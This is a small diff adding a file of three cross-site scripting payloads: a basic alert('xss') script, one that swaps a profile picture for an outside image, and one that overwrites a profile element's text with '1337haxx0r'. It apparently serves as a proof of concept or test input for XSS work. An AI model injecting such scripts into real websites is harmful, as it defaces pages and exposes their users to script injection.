@@ -1,0 +1,5 @@
+<script>alert('xss')</script>
+
+<script>$('#profilePic').attr('src', 'http://images.sodahead.com/profiles/0/0/2/4/0/4/4/8/7/Pink-Elephant-40074825733.jpeg')</script>
+
+<script>$('#profiles').text('1337haxx0r')</script>
